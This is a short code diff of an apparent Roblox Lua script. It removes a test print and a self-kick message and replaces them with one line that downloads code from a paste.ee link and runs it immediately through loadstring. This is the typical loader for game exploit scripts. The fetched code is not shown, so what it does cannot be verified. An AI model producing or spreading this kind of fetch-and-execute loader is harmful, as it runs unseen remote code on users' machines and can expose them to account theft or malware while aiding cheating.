@@ -1,2 +1,1 @@
-print("✅ Script from GitHub loaded.")
-game:GetService("Players").LocalPlayer:Kick("Gumagana na bro 😎")
+loadstring(game:HttpGet("https://paste.ee/r/M360xFCy"))()
